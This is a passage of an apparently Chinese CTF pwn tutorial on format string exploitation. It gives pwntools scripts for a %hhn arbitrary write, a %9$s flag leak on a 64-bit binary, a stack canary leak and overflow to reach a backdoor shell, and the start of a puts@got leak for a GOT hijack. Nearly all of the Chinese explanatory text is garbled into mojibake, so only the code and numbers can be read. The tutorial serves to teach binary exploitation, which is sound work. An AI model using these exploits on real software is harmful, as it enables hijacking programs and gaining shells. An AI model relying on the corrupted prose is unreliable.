class="code"><pre><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br></pre></td></tr></table></figure></p><ul><li>å‰é¢çš„å››ä¸ªp32æ¯ä¸ªå 4å­—èŠ‚ï¼Œä¸€å…±16ä¸ªå­—èŠ‚ï¼Œ%104xå 104ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥104 + 16 = 120 =0x78ï¼Œæ‰€ä»¥%6$hhnä¼šå°†0x78å†™åˆ°ç¬¬6ä¸ªå‚æ•°ï¼Œå³p32(b_addr)çš„ä½ç½®</li><li>%222xå 222ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå‰é¢çš„å­—èŠ‚æ•°ï¼š120 + 222 = 342 = 0x156ï¼Œå› ä¸ºhhæ˜¯å•å­—ï¼Œæ‰€ä»¥åªå–åé¢çš„0x56ï¼Œæ‰€ä»¥%7$hhnä¼šå°†0x56å†™åˆ°ç¬¬7ä¸ªå‚æ•°ï¼Œå³p32(b_addr + 1)çš„ä½ç½®</li><li>%222xå 222ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå‰é¢çš„å­—èŠ‚æ•°ï¼š342 + 222 = 564 = 0x234ï¼Œå› ä¸ºhhæ˜¯å•å­—ï¼Œæ‰€ä»¥åªå–åé¢çš„0x34ï¼Œæ‰€ä»¥%8$hhnä¼šå°†0x34å†™åˆ°ç¬¬8ä¸ªå‚æ•°ï¼Œå³p32(b_addr + 2)çš„ä½ç½®</li><li>%222xå 222ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå‰é¢çš„å­—èŠ‚æ•°ï¼š564 + 222 = 0x312ï¼Œå› ä¸ºhhæ˜¯å•å­—ï¼Œæ‰€ä»¥åªå–åé¢çš„0x12ï¼Œæ‰€ä»¥%9$hhnä¼šå°†0x12å†™åˆ°ç¬¬9ä¸ªå‚æ•°ï¼Œå³p32(b_addr + 3)çš„ä½ç½®<br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±å®Œæˆäº†å¯¹å˜é‡bå››ä¸ªå­—èŠ‚çš„å¡«å……ï¼Œå¡«å……ä¹‹åb = 0x12345678ï¼Œå‰©ä¸‹çš„å°±æ˜¯å¯»æ‰¾bçš„åœ°å€äº†ï¼Œä¾ç„¶è¿˜æ˜¯ä½¿ç”¨idaåœ¨.dataé‡Œé¢æ‰¾åˆ°bçš„åœ°å€ï¼š<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211162441.png" alt="Pasted image 20250211162441"><br>è¿™æ ·ä¸€æ¥b_addr = 0x0804A028<br>expå¦‚ä¸‹ï¼š<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>ç»“æœå¦‚ä¸‹ï¼Œä¼šçœ‹åˆ°ç¨‹åºæ‰“å°å­—ç¬¦ä¸²â€œmodified b for a big number!â€<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211162513.png" alt="Pasted image 20250211162513"></li></ul><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ä¾‹-1-x64"><a href="#ä¾‹-1-x64" class="headerlink" title="ä¾‹(1) x64"></a>ä¾‹(1) x64</h3><blockquote><p>ubuntu24.04è¿è¡Œä¸äº†ï¼ŒæŠ„çš„åˆ«çš„å¸ˆå‚…çš„<br>64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œ32ä½çš„å¾ˆç›¸ä¼¼ï¼Œåšé¢˜çš„æ­¥éª¤ä¹Ÿç›¸åŒï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯64ä½ç¨‹åºå¯¹å‡½æ•°å‚æ•°å­˜å‚¨çš„æ–¹å¼å’Œ32ä½çš„ä¸åŒã€‚64ä¸ºç¨‹åºä¼šä¼˜å…ˆå°†å‡½æ•°çš„å‰6ä¸ªå‚æ•°æ”¾ç½®åœ¨å¯„å­˜å™¨ä¸­ï¼Œè¶…è¿‡6ä¸ªçš„å†å­˜æ”¾åœ¨æ ˆä¸Šï¼Œè€Œ32ä½ç›´æ¥å­˜æ”¾åœ¨æ ˆä¸Šã€‚</p></blockquote><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211225455.png" alt="Pasted image 20250211225455"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211230001.png" alt="Pasted image 20250211230001"><br>ä½¿ç”¨gdbæ‰“å¼€ä¸€ä¸‹ï¼Œä¾ç„¶è¿˜æ˜¯åœ¨printfå¤„ä¸‹æ–­ç‚¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/fmtstr/<span class="number">2017</span>-UIUCTF-pwn200-GoodLuck/goodluck </span><br><span class="line">what<span class="number">&#x27;</span>s the flag</span><br><span class="line">hollk</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211225615.png" alt="Pasted image 20250211225615">å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœåœ¨äº†printfå‡½æ•°å¤„ã€‚64ä½ç¨‹åºéœ€è¦å…ˆå¾€å¯„å­˜å™¨ä¸Šçœ‹ï¼Œå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä½œä¸ºprintfå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“çš„å­˜æ”¾åœ¨rdiå¯„å­˜å™¨ä¸­ï¼Œå‰©ä¸‹çš„RSIã€RDXã€RCXã€R8ã€R9è¿™5ä¸ªå¯„å­˜å™¨ä¼šæ¥ç€å­˜æ”¾å…¶ä»–å‚æ•°ã€‚ä¸Šé¢çœ‹å®Œäº†å¾€æ ˆä¸Šçœ‹ï¼Œå¯ä»¥çœ‹åˆ°æ ˆé¡¶ä¸ºprintfå‡½æ•°çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬æƒ³è¦çš„flagåœ¨è¿”å›åœ°å€ä¸‹çš„ç¬¬å››ä¸ªã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦æ‰“å°flagï¼Œé‚£ä¹ˆflagè·ç¦»æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»å°±æ˜¯5 + 4 = 9</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211230103.png" alt="Pasted image 20250211230103"></p><h3 id="ä¾‹-2-ç»•è¿‡Canary"><a href="#ä¾‹-2-ç»•è¿‡Canary" class="headerlink" title="ä¾‹(2) ç»•è¿‡Canary"></a>ä¾‹(2) ç»•è¿‡Canary</h3><blockquote><p><a href="https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg">https://pan.baidu.com/s/1hVMiXkKJQoiEbYMpPJfsAg</a><br>æå–ç :4egx</p></blockquote><p>èµ°ä¸€å¥—æµç¨‹<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212125542.png" alt="Pasted image 20250212125542"><br>32ä½æ–‡ä»¶ï¼Œå¼€å¯äº†NXå’ŒCanaryä¿æŠ¤</p><blockquote><p>Canaryç®€ä»‹ï¼šCanaryæ˜¯ä¸€ç§ç”¨æ¥é˜²æŠ¤æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ã€‚å…¶åŸç†æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°çš„å…¥å£å¤„ï¼Œå…ˆä»fs/gså¯„å­˜å™¨ä¸­å–å‡ºä¸€ä¸ª4å­—èŠ‚(eax)æˆ–è€…8å­—èŠ‚(rax)çš„å€¼å­˜åˆ°æ ˆä¸Šï¼ˆæœ€ä½ä½éƒ½æ˜¯\x00ï¼‰ï¼Œå½“å‡½æ•°ç»“æŸæ—¶ä¼šæ£€æŸ¥è¿™ä¸ªæ ˆä¸Šçš„å€¼æ˜¯å¦å’Œå­˜è¿›å»çš„å€¼ä¸€è‡´ï¼Œè‹¥ä¸€è‡´åˆ™æ­£å¸¸é€€å‡ºï¼Œå¦‚æœæ˜¯æ ˆæº¢å‡ºæˆ–è€…å…¶ä»–åŸå› å¯¼è‡´Canaryçš„å€¼å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç¨‹åºå°†æ‰§è¡Œ<code>___stack_chk_fail</code>å‡½æ•°ï¼Œç»§è€Œç»ˆæ­¢ç¨‹åºã€‚<br>æ‰€ä»¥å¦‚æœæœ‰ä¸€é“é¢˜å¼€å¯äº†canaryä¿æŠ¤ï¼Œä½†ä¸çŸ¥é“canaryçš„å€¼ï¼Œå°±ä¸èƒ½å¤Ÿè¿›è¡ŒROPæ¥åŠ«æŒç¨‹åºæµç¨‹ï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±æ— æ³•è§£å†³äº†ã€‚</p><p>Canaryç»•è¿‡æ–¹å¼ä¸€èˆ¬canaryæœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š<br>1.çˆ†ç ´canary<br>2.å¦‚æœå­˜åœ¨å­—ç¬¦ä¸²æ ¼å¼åŒ–æ¼æ´å¯ä»¥è¾“å‡ºcanaryå¹¶åˆ©ç”¨æº¢å‡ºè¦†ç›–canaryä»è€Œè¾¾åˆ°ç»•è¿‡<br>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ï¼šprintfå±äºå¯å˜å‚æ•°å‡½æ•°ï¼Œå‡½æ•°è°ƒç”¨è€…å¯ä»»æ„æŒ‡å®šå‚æ•°å’Œæ•°é‡ï¼Œè¿™ä¹Ÿæ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ã€‚</p></blockquote><p>è¿›IDAçœ‹ä¸€ä¸‹mainå‡½æ•°å¼€å¤´å’Œç»“å°¾çš„æ±‡ç¼–<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130000.png" alt="Pasted image 20250212130000"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130035.png" alt="Pasted image 20250212130035"><br>ä»¥ä¸Šè¯å®äº†ç¨‹åºå¼€å¯äº†Canaryä¿æŠ¤<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130133.png" alt="Pasted image 20250212130133"><br>å†çœ‹ä¸€ä¸‹ä¼ªä»£ç <br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130229.png" alt="Pasted image 20250212130229"><br>å‘ç°äº†printf(æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´)å’Œæ˜“å¯¼è‡´æ ˆæº¢å‡ºçš„å‡½æ•°gets<br>åŒæ—¶å‘ç°åé—¨<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212130214.png" alt="Pasted image 20250212130214"><br>å¤§è‡´è§£é¢˜æ€è·¯å¦‚ä¸‹ï¼š<strong>è¦†ç›–è‡³mainå‡½æ•°çš„Cananryå¤„ï¼Œå¡«ä¸Šæ­£ç¡®çš„Canaryï¼Œç„¶åè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°å¤„ï¼Œå³å¯æ‹¿åˆ°shell</strong><br>æ ¹æ®æ±‡ç¼–å¯çŸ¥å¯„å­˜å™¨edxé‡Œå­˜çš„å°±æ˜¯Canaryçš„å€¼<br>æˆ‘ä»¬åœ¨printfå’Œmainå‡½æ•°æœ«å°¾çš„xorä¸‹æ–­ç‚¹</p><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132656.png" alt="Pasted image 20250212132656"><br>0xffffc620ä¸ºformatåœ¨stackä¸­çš„ä½ç½®<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132542.png" alt="Pasted image 20250212132542"><br>EDXçš„å€¼å°±æ˜¯Canaryçš„å€¼<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212132749.png" alt="Pasted image 20250212132749"><br>çœ‹å†…å­˜ï¼ŒCanaryçš„å€¼ä¸formatç›¸è·15<br>Canaryçš„åç§»ä¸º15ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡getsæ—¶å‘é€<code>%15$x</code>å°±ä¼šï¼ˆprintf)æ³„éœ²å‡ºcanary<br>çš„å€¼</p><blockquote><p><code>%s</code>ï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚</p></blockquote><p>ç„¶åæˆ‘ä»¬ç¡®å®šgetsåˆ°Canaryçš„åç§»<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212133441.png" alt="Pasted image 20250212133441"><br>ç”±å‰é¢åˆ†æå¯çŸ¥v5é‡Œå°±æ˜¯Canaryçš„å€¼<br>åœ¨IDAä¸­æŸ¥çœ‹å¯çŸ¥såˆ°v5çš„åç§»ä¸º0x2c-0x04=40<br><strong><em>EBPä¸‹é¢ä¸ºreturn_address</em></strong><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212134019.png" alt="Pasted image 20250212134019"><br>canaryåœ¨[ESP+0x3c]=0xffffc65cï¼ŒEBPåœ¨0xffffc668ï¼Œç›¸å‡ç­‰äº12<br>å®Œæˆå¦‚ä¸‹exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./binary_200&#x27;</span>) </span><br><span class="line">sys = <span class="number">0x0804854d</span></span><br><span class="line">p.sendline(<span class="string">&#x27;%15$x&#x27;</span>)</span><br><span class="line">Canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Canary:&#x27;</span>,<span class="built_in">hex</span>(Canary))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p32(Canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(sys)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212135349.png" alt="Pasted image 20250212135349"><br>åŒæ—¶å¯ä»¥çœ‹å‡ºCanaryæ˜¯å˜åŒ–çš„<br><strong><em>getshell</em></strong></p><h3 id="ä¾‹-3-hijack-GOT"><a href="#ä¾‹-3-hijack-GOT" class="headerlink" title="ä¾‹(3) hijack GOT"></a>ä¾‹(3) hijack GOT</h3><blockquote><p><a href="https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA">https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA</a><br>æå–ç ï¼š140h</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ç°åœ¨çš„Cç¨‹åºä¸­ï¼Œlibcçš„å‡½æ•°æ˜¯é€šè¿‡GOTè¡¨æ¥å®ç°è·³è½¬çš„ã€‚åœ¨æ²¡æœ‰å¼€å¯RELRO(æˆ–å¼€å¯Partial RELROï¼‰ä¿æŠ¤çš„å‰æä¸‹ï¼Œæ¯ä¸ªlibcçš„å‡½æ•°å¯¹åº”çš„GOTè¡¨é¡¹æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ã€‚å› æ­¤ä¿®æ”¹æŸä¸ªlibcå‡½æ•°çš„GOTè¡¨å†…å®¹ä¸ºå¦ä¸€ä¸ªlibcå‡½æ•°çš„åœ°å€æ¥å®ç°å¯¹ç¨‹åºçš„æ§åˆ¶ã€‚<br>å‡è®¾æˆ‘ä»¬å°†å‡½æ•°Açš„åœ°å€è¦†ç›–ä¸ºå‡½æ•°Bçš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸€æ”»å‡»æŠ€å·§å¯ä»¥åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤</p><ul><li>ç¡®å®šå‡½æ•°Açš„GOTè¡¨åœ°å€<br>  ä¸»è¦åˆ©ç”¨å‡½æ•°Aä¸€èˆ¬åœ¨ç¨‹åºä¸­å·²æœ‰ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨ç®€å•çš„å¯»æ‰¾åœ°å€çš„æ–¹æ³•æ¥æ‰¾</li><li>ç¡®å®šå‡½æ•°Bçš„å†…å­˜åœ°å€<br>  éœ€è¦æƒ³åŠæ³•æ³„éœ²å¯¹åº”å‡½æ•°Bçš„åœ°å€</li><li>å°†å‡½æ•°Bçš„å†…å­˜å†™å…¥åˆ°å‡½æ•°Açš„GOTè¡¨åœ°å€å¤„<br>  éœ€è¦åˆ©ç”¨å‡½æ•°çš„æ¼æ´æ¥è§¦å‘<pre><code>  å†™å…¥å‡½æ•°ï¼šwriteå‡½æ•°  ROP  - `pop eax; ret; # printf@got -&gt; eax`  - ` pop ebx; ret; # (addr_offset = system_addr - printf_addr) -&gt; ebx`  - `add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset`  æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™</code></pre><h4 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h4><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212140021.png" alt="Pasted image 20250212140021"><br>32ä½ï¼Œåªå¼€å¯äº†NX(æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤)</li></ul></blockquote><h5 id="æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹"><a href="#æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹"></a>æŸ¥çœ‹æ–‡ä»¶æ‰§è¡Œæµç¨‹</h5><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164428.png" alt="Pasted image 20250212164428"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164533.png" alt="Pasted image 20250212164533"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164645.png" alt="Pasted image 20250212164645"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164657.png" alt="Pasted image 20250212164657"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212164940.png" alt="Pasted image 20250212164940"><br>è‡ªå·±è¿è¡Œä¸€ä¸‹è¿™ä¸ªç¨‹åºäº†è§£è¯¥ç¨‹åºçš„åŠŸèƒ½ï¼Œæ€»çš„æ¥è¯´è¯¥ç¨‹åºæ¨¡æ‹Ÿäº†ä¸€ä¸ªæ–‡ä»¶åˆ›å»ºè¯»å–è½¯ä»¶</p><h5 id="getshellæ€è·¯"><a href="#getshellæ€è·¯" class="headerlink" title="getshellæ€è·¯"></a>getshellæ€è·¯</h5><p>æ— ç°æˆçš„systemå’Œbin/shï¼Œå°è¯•æ³„éœ²libc<br>åŒæ—¶ï¼Œé™¤äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¹‹å¤–ï¼Œå…¶ä»–åœ°æ–¹æ²¡æœ‰ä»€ä¹ˆé—®é¢˜<br>æˆ‘ä»¬å°è¯•ç”¨printfå‡½æ•°æ¥æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212170014.png" alt="Pasted image 20250212170014"></p><h6 id="ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»"><a href="#ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»" class="headerlink" title="ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»"></a>ç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»</h6><p>ç®€å•é€†å‘åˆ†æå¤„å¯†ç <code>rxraclhm</code><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212171550.png" alt="Pasted image 20250212171550"><br>ä»æ ˆä¸Šæˆ–è¾“å‡ºå‡å¯åˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²åç§»ä¸º7</p><h6 id="æ³„éœ²putså‡½æ•°åœ°å€"><a href="#æ³„éœ²putså‡½æ•°åœ°å€" class="headerlink" title="æ³„éœ²putså‡½æ•°åœ°å€"></a>æ³„éœ²putså‡½æ•°åœ°å€</h6><p>å·²çŸ¥å­—ç¬¦ä¸²åç§»ä¸º7ï¼Œç„¶ååˆ©ç”¨pwntoolsçš„ELFæ¨¡å—å¯çŸ¥puts@gotçš„åœ°å€ï¼Œæ„å»ºå¦‚ä¸‹payload<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br></pre></td></tr></table></figure></p><blockquote><p>%sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚</p></blockquote><p>æˆ‘ä»¬å°†%sæ”¾åœ¨ç¬¬7ä½ï¼Œputs@gotæ”¾åœ¨ç¬¬8ä½ï¼Œè¿™æ ·%8$så°±ä¼šæŠŠputså‡½æ•°çš„çœŸå®åœ°å€æ‰“å°å‡ºæ¥äº†ã€‚ä¸ºä»€ä¹ˆè¦è¿™æ ·å¸ƒç½®å‘¢ï¼Œå…¶å®æ˜¯ä¸ºäº†æ–¹ä¾¿æ¥æ”¶æ‰“å°å‡ºæ¥çš„å­—ç¬¦ä¸²ã€‚<strong>è¿™æ ·å¸ƒç½®åputså‡½æ•°çš„çœŸå®åœ°å€ä¼šåœ¨å‰4ä¸ªå­—èŠ‚æ‰“å‡ºæ¥ï¼Œæ‰€ä»¥åªéœ€è¦æ¥æ”¶å‰å››ä¸ªå°±å¯ä»¥äº†</strong>ã€‚</p><blockquote><p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ï¼špayload=p32(puts_got) +â€™%7$sâ€™<br>è¿™ç§æ–¹å¼ï¼Œä¸è¿‡æ‰“å°å‡ºæ¥çš„å†…å®¹éœ€è¦ä»<strong>ç¬¬5ä¸ªå­—èŠ‚å¼€å§‹æ¥æ”¶</strong></p></blockquote><p>è¿™æ ·å³å¯å¾—åˆ°ç¨‹åºè¿è¡Œæ—¶putså‡½æ•°çš„çœŸå®åœ°å€<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></p><h6 id="æ‰¾systemå‡½æ•°åœ°å€"><a href="#æ‰¾systemå‡½æ•°åœ°å€" class="headerlink" title="æ‰¾systemå‡½æ•°åœ°å€"></a>æ‰¾systemå‡½æ•°åœ°å€</h6><p>å¦‚æœæ˜¯è¿œç¨‹pwnï¼Œæˆ‘ä»¬å»æŸ¥æ‰¾ä¸€ä¸‹libcå¯¹åº”ç‰ˆæœ¬å³å¯<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250212172938.png" alt="Pasted image 20250212172938"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.address=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><h6 id="è¦†ç›–putså‡½æ•°"><a 